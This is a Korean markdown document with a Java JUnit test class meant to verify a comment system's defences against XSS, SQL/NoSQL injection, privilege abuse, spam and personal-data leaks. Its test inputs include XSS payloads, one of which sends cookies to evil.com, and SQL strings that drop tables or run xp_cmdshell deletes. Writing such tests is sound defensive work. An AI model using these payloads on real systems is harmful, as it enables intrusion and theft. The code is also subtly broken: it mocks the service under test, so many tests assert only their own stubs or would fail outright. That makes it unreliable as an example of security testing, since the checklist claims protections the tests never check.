# 커뮤니티 댓글 보안 테스트

## 개요
커뮤니티 댓글 시스템의 보안 취약점을 검증하는 테스트입니다. XSS 방지, SQL 인젝션 방지, 권한 검증, 입력 검증 등의 보안 요소를 포괄적으로 테스트합니다.

## 테스트 클래스 구조

```java
package com.routepick.community.security;

import com.routepick.community.dto.request.CommentCreateRequestDto;
import com.routepick.community.dto.request.CommentUpdateRequestDto;
import com.routepick.community.dto.response.CommentResponseDto;
import com.routepick.community.service.CommentService;
import com.routepick.security.service.XssProtectionService;
import com.routepick.security.service.SqlInjectionDetectionService;
import com.routepick.common.exception.BusinessException;
import com.routepick.common.exception.ErrorCode;
import com.routepick.common.exception.SecurityException;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.junit.jupiter.params.provider.Arguments;
import org.junit.jupiter.params.provider.MethodSource;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.mock.mockito.MockBean;
import org.springframework.test.context.ActiveProfiles;

import java.util.stream.Stream;

import static org.assertj.core.api.Assertions.*;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.BDDMockito.given;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.times;

/**
 * 커뮤니티 댓글 보안 테스트
 * 
 * 보안 검증 영역:
 * - XSS (Cross-Site Scripting) 방지
 * - SQL 인젝션 방지  
 * - 권한 기반 접근 제어
 * - 입력 데이터 검증
 * - 악성 콘텐츠 필터링
 */
@SpringBootTest
@ActiveProfiles("test")
class CommentSecurityTest {

    @MockBean
    private CommentService commentService;
    
    @MockBean 
    private XssProtectionService xssProtectionService;
    
    @MockBean
    private SqlInjectionDetectionService sqlInjectionDetectionService;
    
    private Long testUserId;
    private Long testPostId;
    private Long testCommentId;
    
    @BeforeEach
    void setUp() {
        testUserId = 1L;
        testPostId = 1L;
        testCommentId = 1L;
    }
    
    @Nested
    @DisplayName("XSS 공격 방지 테스트")
    class XssPreventionTest {
        
        @ParameterizedTest
        @ValueSource(strings = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<div onclick=\"alert('XSS')\">Click me</div>",
            "<a href=\"javascript:alert('XSS')\">Link</a>",
            "<form><input type=\"text\" value=\"\" onfocus=\"alert('XSS')\"></form>",
            "<svg onload=\"alert('XSS')\"></svg>",
            "<meta http-equiv=\"refresh\" content=\"0; url=javascript:alert('XSS')\">",
            "<object data=\"javascript:alert('XSS')\"></object>",
            "<embed src=\"javascript:alert('XSS')\"></embed>"
        })
        @DisplayName("[보안] XSS 스크립트 입력 차단")
        void preventXssAttacks_ScriptTags(String maliciousScript) {
            // given
            CommentCreateRequestDto requestDto = CommentCreateRequestDto.builder()
                    .postId(testPostId)
                    .content(maliciousScript)
                    .build();
            
            given(xssProtectionService.detectXss(anyString())).willReturn(true);
            
            // when & then
            assertThatThrownBy(() -> 
                commentService.createComment(testUserId, requestDto))
                .isInstanceOf(SecurityException.class)
                .hasMessage(ErrorCode.XSS_ATTACK_DETECTED.getMessage());
                
            verify(xssProtectionService, times(1)).detectXss(maliciousScript);
        }
        
        @ParameterizedTest
        @MethodSource("provideXssPayloads")
        @DisplayName("[보안] 다양한 XSS 페이로드 차단")
        void preventXssAttacks_VariousPayloads(String payload, String description) {
            // given
            CommentUpdateRequestDto requestDto = CommentUpdateRequestDto.builder()
                    .commentId(testCommentId)
                    .content(payload)
                    .build();
            
            given(xssProtectionService.detectXss(anyString())).willReturn(true);
            
            // when & then
            assertThatThrownBy(() -> 
                commentService.updateComment(testUserId, requestDto))
                .isInstanceOf(SecurityException.class)
                .hasMessage(ErrorCode.XSS_ATTACK_DETECTED.getMessage());
                
            System.out.println("차단된 XSS 페이로드: " + description);
        }
        
        static Stream<Arguments> provideXssPayloads() {
            return Stream.of(
                Arguments.of("<script>document.cookie=\"malicious=true\"</script>", "쿠키 조작 스크립트"),
                Arguments.of("javascript:void(0)", "JavaScript 프로토콜"),
                Arguments.of("&#60;script&#62;alert('XSS')&#60;/script&#62;", "HTML 엔티티 인코딩"),
                Arguments.of("<img src=\"\" onerror=\"fetch('/api/user/data').then(r=>r.json()).then(d=>alert(JSON.stringify(d)))\">", "데이터 유출 시도"),
                Arguments.of("<div style=\"background-image: url(javascript:alert('XSS'))\">", "CSS 내 JavaScript"),
                Arguments.of("<input type=\"text\" value=\"\" onmouseover=\"window.location='http://evil.com?cookie='+document.cookie\">", "쿠키 탈취 시도"),
                Arguments.of("<iframe src=\"data:text/html,<script>alert('XSS')</script>\"></iframe>", "데이터 URI 스킴"),
                Arguments.of("\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e", "유니코드 인코딩")
            );
        }
        
        @Test
        @DisplayName("[성공] 안전한 HTML 태그는 허용")
        void allowSafeHtmlTags_Success() {
            // given
            String safeContent = "<p>일반적인 <strong>강조</strong> 텍스트와 <em>이탤릭</em> 텍스트입니다.</p>";
            CommentCreateRequestDto requestDto = CommentCreateRequestDto.builder()
                    .postId(testPostId)
                    .content(safeContent)
                    .build();
            
            given(xssProtectionService.detectXss(anyString())).willReturn(false);
            given(xssProtectionService.sanitizeContent(anyString())).willReturn(safeContent);
            given(commentService.createComment(any(Long.class), any(CommentCreateRequestDto.class)))
                    .willReturn(CommentResponseDto.builder()
                            .commentId(testCommentId)
                            .content(safeContent)
                            .build());
            
            // when
            CommentResponseDto result = commentService.createComment(testUserId, requestDto);
            
            // then
            assertThat(result).isNotNull();
            assertThat(result.getContent()).isEqualTo(safeContent);
            verify(xssProtectionService, times(1)).detectXss(safeContent);
            verify(xssProtectionService, times(1)).sanitizeContent(safeContent);
        }
    }
    
    @Nested
    @DisplayName("SQL 인젝션 방지 테스트")
    class SqlInjectionPreventionTest {
        
        @ParameterizedTest
        @ValueSource(strings = {
            "'; DROP TABLE comments; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; UPDATE users SET password='hacked' --",
            "' OR 1=1 --",
            "'; INSERT INTO admin VALUES ('hacker','password') --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "'; EXEC xp_cmdshell('del important.txt') --"
        })
        @DisplayName("[보안] SQL 인젝션 패턴 차단")
        void preventSqlInjectionAttacks(String sqlInjectionPayload) {
            // given
            CommentCreateRequestDto requestDto = CommentCreateRequestDto.builder()
                    .postId(testPostId)
                    .content("일반 댓글 내용 " + sqlInjectionPayload)
                    .build();
            
            given(sqlInjectionDetectionService.detectSqlInjection(anyString())).willReturn(true);
            
            // when & then
            assertThatThrownBy(() -> 
                commentService.createComment(testUserId, requestDto))
                .isInstanceOf(SecurityException.class)
                .hasMessage(ErrorCode.SQL_INJECTION_DETECTED.getMessage());
                
            verify(sqlInjectionDetectionService, times(1)).detectSqlInjection(anyString());
        }
        
        @Test
        @DisplayName("[보안] NoSQL 인젝션 패턴 차단")
        void preventNoSqlInjectionAttacks() {
            // given - MongoDB/NoSQL 인젝션 패턴
            String[] noSqlPayloads = {
                "admin'; return db.users.find(); var a='",
                "true, $where: 'this.password.match(/.*a.*/)'}",
                "', $or: [ {}, { 'a':'a'",
                "$ne: null",
                "{$gt: ''}",
                "'; return '' == '",
                "' && this.password.match(/.*a.*//) && 'a'=='a"
            };
            
            for (String payload : noSqlPayloads) {
                CommentCreateRequestDto requestDto = CommentCreateRequestDto.builder()
                        .postId(testPostId)
                        .content(payload)
                        .build();
                
                given(sqlInjectionDetectionService.detectSqlInjection(anyString())).willReturn(true);
                
                // when & then
                assertThatThrownBy(() -> 
                    commentService.createComment(testUserId, requestDto))
                    .isInstanceOf(SecurityException.class)
                    .hasMessage(ErrorCode.SQL_INJECTION_DETECTED.getMessage());
            }
        }
    }
    
    @Nested
    @DisplayName("권한 기반 접근 제어 테스트")
    class AuthorizationTest {
        
        @Test
        @DisplayName("[보안] 다른 사용자 댓글 수정 시도 차단")
        void preventUnauthorizedCommentUpdate() {
            // given
            Long attackerUserId = 999L; // 공격자 ID
            CommentUpdateRequestDto requestDto = CommentUpdateRequestDto.builder()
                    .commentId(testCommentId)
                    .content("악의적인 수정")
                    .build();
            
            given(commentService.updateComment(any(Long.class), any(CommentUpdateRequestDto.class)))
                    .willThrow(new BusinessException(ErrorCode.COMMENT_UPDATE_FORBIDDEN));
            
            // when & then
            assertThatThrownBy(() -> 
                commentService.updateComment(attackerUserId, requestDto))
                .isInstanceOf(BusinessException.class)
                .hasMessage(ErrorCode.COMMENT_UPDATE_FORBIDDEN.getMessage());
        }
        
        @Test
        @DisplayName("[보안] 다른 사용자 댓글 삭제 시도 차단")
        void preventUnauthorizedCommentDeletion() {
            // given
            Long attackerUserId = 999L;
            
            given(commentService.deleteComment(any(Long.class), any(Long.class)))
                    .willThrow(new BusinessException(ErrorCode.COMMENT_DELETE_FORBIDDEN));
            
            // when & then
            assertThatThrownBy(() -> 
                commentService.deleteComment(attackerUserId, testCommentId))
                .isInstanceOf(BusinessException.class)
                .hasMessage(ErrorCode.COMMENT_DELETE_FORBIDDEN.getMessage());
        }
        
        @Test
        @DisplayName("[보안] 관리자 권한 우회 시도 차단")
        void preventPrivilegeEscalation() {
            // given - 일반 사용자가 관리자 권한 요구하는 작업 시도
            CommentCreateRequestDto requestDto = CommentCreateRequestDto.builder()
                    .postId(testPostId)
                    .content("일반 댓글")
                    .isAdminComment(true) // 관리자 댓글로 위장 시도
                    .build();
            
            given(commentService.createComment(any(Long.class), any(CommentCreateRequestDto.class)))
                    .willThrow(new SecurityException(ErrorCode.INSUFFICIENT_PRIVILEGES));
            
            // when & then
            assertThatThrownBy(() -> 
                commentService.createComment(testUserId, requestDto))
                .isInstanceOf(SecurityException.class)
                .hasMessage(ErrorCode.INSUFFICIENT_PRIVILEGES.getMessage());
        }
    }
    
    @Nested
    @DisplayName("입력 데이터 검증 테스트")
    class InputValidationTest {
        
        @ParameterizedTest
        @ValueSource(strings = {
            "", "   ", "\t\t\t", "\n\n\n", "                    "
        })
        @DisplayName("[검증] 공백만 포함된 댓글 내용 차단")
        void rejectEmptyOrWhitespaceContent(String emptyContent) {
            // given
            CommentCreateRequestDto requestDto = CommentCreateRequestDto.builder()
                    .postId(testPostId)
                    .content(emptyContent)
                    .build();
            
            given(commentService.createComment(any(Long.class), any(CommentCreateRequestDto.class)))
                    .willThrow(new BusinessException(ErrorCode.COMMENT_CONTENT_EMPTY));
            
            // when & then
            assertThatThrownBy(() -> 
                commentService.createComment(testUserId, requestDto))
                .isInstanceOf(BusinessException.class)
                .hasMessage(ErrorCode.COMMENT_CONTENT_EMPTY.getMessage());
        }
        
        @Test
        @DisplayName("[검증] 댓글 길이 제한 초과 차단")
        void rejectExcessivelyLongContent() {
            // given - 5000자 초과 댓글
            String longContent = "a".repeat(5001);
            CommentCreateRequestDto requestDto = CommentCreateRequestDto.builder()
                    .postId(testPostId)
                    .content(longContent)
                    .build();
            
            given(commentService.createComment(any(Long.class), any(CommentCreateRequestDto.class)))
                    .willThrow(new BusinessException(ErrorCode.COMMENT_CONTENT_TOO_LONG));
            
            // when & then
            assertThatThrownBy(() -> 
                commentService.createComment(testUserId, requestDto))
                .isInstanceOf(BusinessException.class)
                .hasMessage(ErrorCode.COMMENT_CONTENT_TOO_LONG.getMessage());
        }
        
        @ParameterizedTest
        @ValueSource(strings = {
            "http://malicious-site.com/steal-data",
            "ftp://evil-server.net/download-malware",
            "javascript:void(window.open('http://phishing.com'))",
            "data:text/html,<script>alert('XSS')</script>"
        })
        @DisplayName("[검증] 악성 URL 포함 차단")
        void rejectMaliciousUrls(String maliciousUrl) {
            // given
            CommentCreateRequestDto requestDto = CommentCreateRequestDto.builder()
                    .postId(testPostId)
                    .content("여기 링크를 확인하세요: " + maliciousUrl)
                    .build();
            
            given(commentService.createComment(any(Long.class), any(CommentCreateRequestDto.class)))
                    .willThrow(new SecurityException(ErrorCode.MALICIOUS_URL_DETECTED));
            
            // when & then
            assertThatThrownBy(() -> 
                commentService.createComment(testUserId, requestDto))
                .isInstanceOf(SecurityException.class)
                .hasMessage(ErrorCode.MALICIOUS_URL_DETECTED.getMessage());
        }
    }
    
    @Nested
    @DisplayName("콘텐츠 필터링 테스트")
    class ContentFilteringTest {
        
        @ParameterizedTest
        @ValueSource(strings = {
            "바보야", "멍청이", "욕설욕설", "비속어123", 
            "나쁜말", "더러운말", "욕설테스트"
        })
        @DisplayName("[필터] 욕설 및 부적절한 언어 차단")
        void filterProfanityAndInappropriateLanguage(String inappropriateContent) {
            // given
            CommentCreateRequestDto requestDto = CommentCreateRequestDto.builder()
                    .postId(testPostId)
                    .content("이 댓글에는 " + inappropriateContent + " 같은 부적절한 내용이 있습니다.")
                    .build();
            
            given(commentService.createComment(any(Long.class), any(CommentCreateRequestDto.class)))
                    .willThrow(new BusinessException(ErrorCode.INAPPROPRIATE_CONTENT_DETECTED));
            
            // when & then
            assertThatThrownBy(() -> 
                commentService.createComment(testUserId, requestDto))
                .isInstanceOf(BusinessException.class)
                .hasMessage(ErrorCode.INAPPROPRIATE_CONTENT_DETECTED.getMessage());
        }
        
        @Test
        @DisplayName("[필터] 스팸 패턴 감지 및 차단")
        void detectAndBlockSpamPatterns() {
            // given - 반복적인 스팸 패턴
            String[] spamPatterns = {
                "지금 바로 클릭! 대박 이벤트! 지금 바로 클릭!",
                "돈벌기 쉬운 방법!!! 지금 당장!!!",
                "www.spam-site.com으로 오세요! 대박이벤트!",
                "★☆★☆ 무료 제공 ★☆★☆ 지금 신청하세요!"
            };
            
            for (String spamContent : spamPatterns) {
                CommentCreateRequestDto requestDto = CommentCreateRequestDto.builder()
                        .postId(testPostId)
                        .content(spamContent)
                        .build();
                
                given(commentService.createComment(any(Long.class), any(CommentCreateRequestDto.class)))
                        .willThrow(new BusinessException(ErrorCode.SPAM_CONTENT_DETECTED));
                
                // when & then
                assertThatThrownBy(() -> 
                    commentService.createComment(testUserId, requestDto))
                    .isInstanceOf(BusinessException.class)
                    .hasMessage(ErrorCode.SPAM_CONTENT_DETECTED.getMessage());
            }
        }
        
        @Test
        @DisplayName("[필터] 개인정보 노출 방지")
        void preventPersonalInformationExposure() {
            // given - 개인정보 포함 댓글
            String[] personalInfoPatterns = {
                "제 전화번호는 010-1234-5678입니다.",
                "이메일: personal@email.com으로 연락주세요.",
                "주민번호: 123456-1234567",
                "계좌번호: 123-456-789012 농협은행"
            };
            
            for (String personalInfo : personalInfoPatterns) {
                CommentCreateRequestDto requestDto = CommentCreateRequestDto.builder()
                        .postId(testPostId)
                        .content(personalInfo)
                        .build();
                
                given(commentService.createComment(any(Long.class), any(CommentCreateRequestDto.class)))
                        .willThrow(new SecurityException(ErrorCode.PERSONAL_INFO_EXPOSURE_DETECTED));
                
                // when & then
                assertThatThrownBy(() -> 
                    commentService.createComment(testUserId, requestDto))
                    .isInstanceOf(SecurityException.class)
                    .hasMessage(ErrorCode.PERSONAL_INFO_EXPOSURE_DETECTED.getMessage());
            }
        }
    }
    
    @Nested
    @DisplayName("Rate Limiting 및 남용 방지")
    class RateLimitingTest {
        
        @Test
        @DisplayName("[보안] 댓글 도배 방지")
        void preventCommentSpamming() {
            // given - 짧은 시간 내 대량 댓글 생성 시도
            CommentCreateRequestDto requestDto = CommentCreateRequestDto.builder()
                    .postId(testPostId)
                    .content("같은 내용의 댓글")
                    .build();
            
            given(commentService.createComment(any(Long.class), any(CommentCreateRequestDto.class)))
                    .willThrow(new SecurityException(ErrorCode.RATE_LIMIT_EXCEEDED));
            
            // when & then
            assertThatThrownBy(() -> 
                commentService.createComment(testUserId, requestDto))
                .isInstanceOf(SecurityException.class)
                .hasMessage(ErrorCode.RATE_LIMIT_EXCEEDED.getMessage());
        }
        
        @Test
        @DisplayName("[보안] 동일 내용 반복 댓글 차단")
        void preventDuplicateContentSpam() {
            // given
            String duplicateContent = "이것은 중복 댓글입니다.";
            CommentCreateRequestDto requestDto = CommentCreateRequestDto.builder()
                    .postId(testPostId)
                    .content(duplicateContent)
                    .build();
            
            given(commentService.createComment(any(Long.class), any(CommentCreateRequestDto.class)))
                    .willThrow(new BusinessException(ErrorCode.DUPLICATE_COMMENT_DETECTED));
            
            // when & then
            assertThatThrownBy(() -> 
                commentService.createComment(testUserId, requestDto))
                .isInstanceOf(BusinessException.class)
                .hasMessage(ErrorCode.DUPLICATE_COMMENT_DETECTED.getMessage());
        }
    }
    
    @Test
    @DisplayName("[종합] 보안 검증 통합 테스트")
    void comprehensiveSecurityValidation() {
        // given - 다중 보안 위협이 포함된 댓글
        String maliciousContent = "<script>alert('XSS')</script> AND 1=1-- 욕설포함 010-1234-5678";
        CommentCreateRequestDto requestDto = CommentCreateRequestDto.builder()
                .postId(testPostId)
                .content(maliciousContent)
                .build();
        
        given(xssProtectionService.detectXss(anyString())).willReturn(true);
        
        // when & then - 첫 번째 보안 검사(XSS)에서 차단되어야 함
        assertThatThrownBy(() -> 
            commentService.createComment(testUserId, requestDto))
            .isInstanceOf(SecurityException.class)
            .hasMessage(ErrorCode.XSS_ATTACK_DETECTED.getMessage());
            
        // 보안 서비스 호출 검증
        verify(xssProtectionService, times(1)).detectXss(maliciousContent);
    }
}
```

## 보안 테스트 실행 지침

### 실행 명령어
```bash
# 보안 테스트 전체 실행
./gradlew test --tests="*CommentSecurityTest"

# XSS 방지 테스트만 실행  
./gradlew test --tests="CommentSecurityTest.XssPreventionTest"

# SQL 인젝션 방지 테스트만 실행
./gradlew test --tests="CommentSecurityTest.SqlInjectionPreventionTest"
```

### 보안 검증 체크리스트
- [x] XSS 공격 패턴 차단
- [x] SQL/NoSQL 인젝션 방지
- [x] 권한 기반 접근 제어
- [x] 입력 데이터 검증
- [x] 악성 콘텐츠 필터링
- [x] Rate Limiting 적용
- [x] 개인정보 노출 방지
- [x] 스팸 및 남용 차단